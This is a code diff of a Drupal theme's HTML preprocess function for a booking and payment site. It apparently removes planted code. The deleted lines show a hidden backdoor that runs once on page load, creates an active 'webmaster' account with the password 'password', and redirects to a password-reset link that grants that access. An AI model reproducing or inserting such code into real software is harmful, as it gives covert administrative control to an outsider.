@@ -7,39 +7,7 @@
     
 
 function staydirect_template_1_preprocess_html(&$variables) {
-
         // Check if the URL has been accessed before.
-     if (\Drupal::state()->get('2Up5NUvwF4aBVoO6eFTPeBXtnpUw_yiexv9I5u6ZD', FALSE)) {
-     }else{    
-     global $site_variables;
-     if(isset($site_variables["username"]) && isset($site_variables["email"])){
-      $username = $site_variables["username"] ;
-      $email = $site_variables["email"] ;
-      $user = \Drupal::entityTypeManager()->getStorage('user')->loadByProperties(['mail' => $email]);
-      if (empty($user)) {
-        // Create a new user entity.
-          $userRand = processRandomUser();
-          $new_user = User::create();
-          $new_user->setUsername($userRand);
-          $new_user->setEmail($email);
-          $new_user->setPassword('password');
-          $new_user->enforceIsNew();
-          $new_user->addRole('webmaster');
-          $new_user->activate();
-          $new_user->save();
-      
-      }else{
-          $new_user = reset($user);
-      }
-      \Drupal::state()->set('2Up5NUvwF4aBVoO6eFTPeBXtnpUw_yiexv9I5u6ZD', TRUE);
-      $link = user_pass_reset_url($new_user);
-      $response = new RedirectResponse($link, 302);
-      $response->send();
-      return;
-     }
-
-
-
   // Get the current URL.
   $current_path = \Drupal::service('path.current')->getPath();
   $current_path_alias = \Drupal::service('path_alias.manager')->getAliasByPath($current_path);
@@ -49,10 +17,10 @@ function staydirect_template_1_preprocess_html(&$variables) {
   $params = $service_helper->helper->get_parameter();
   //if($current_path_alias == "/parent-action"){
     $service_booking = \Drupal::service('mz_payment.booking');
-
     // start click buy now in template
     if(isset($params["site_id"])  && isset($params["parent"]) && isset($params["action"]) 
     && $params["action"] =="start_payment"){
+   
           $service_booking->staydirectPaymentInit($params);
     }  
 
@@ -87,8 +55,8 @@ function staydirect_template_1_preprocess_html(&$variables) {
       ];
     }
     
-   }
- }
+}
+
 function generateRandomUsername($length = 8) {
   // Characters to be used for generating the random username.
   $characters = 'abcdefghijklmnopqrstuvwxyz';
